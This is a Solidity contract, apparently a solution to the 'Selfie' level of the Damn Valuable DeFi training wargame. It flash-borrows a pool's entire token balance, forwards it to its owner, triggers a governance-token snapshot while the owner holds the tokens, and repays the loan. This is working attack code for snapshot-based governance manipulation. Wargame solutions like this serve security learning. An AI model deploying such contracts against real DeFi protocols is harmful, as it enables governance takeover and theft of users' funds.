// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import '../../selfie/SelfiePool.sol';
import '../../DamnValuableTokenSnapshot.sol';

contract SelfiePoolAttacker {
    address immutable owner;
    SelfiePool immutable pool;

    constructor(SelfiePool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function flashLoan() external {
        pool.flashLoan(
            pool.token().balanceOf(address(pool))
        );
    }

    function receiveTokens(address token, uint256 borrowAmount) external {
        DamnValuableTokenSnapshot typedToken = DamnValuableTokenSnapshot(token);

        require(typedToken.balanceOf(address(pool)) == 0, 'Must borrow all the tokens');
        require(typedToken.allowance(owner, address(this)) >= borrowAmount, 'The owner must allow the contract to transfer the tokens back');

        typedToken.transfer(owner, borrowAmount);
        typedToken.snapshot();
        typedToken.transferFrom(owner, address(pool), borrowAmount);
    }

}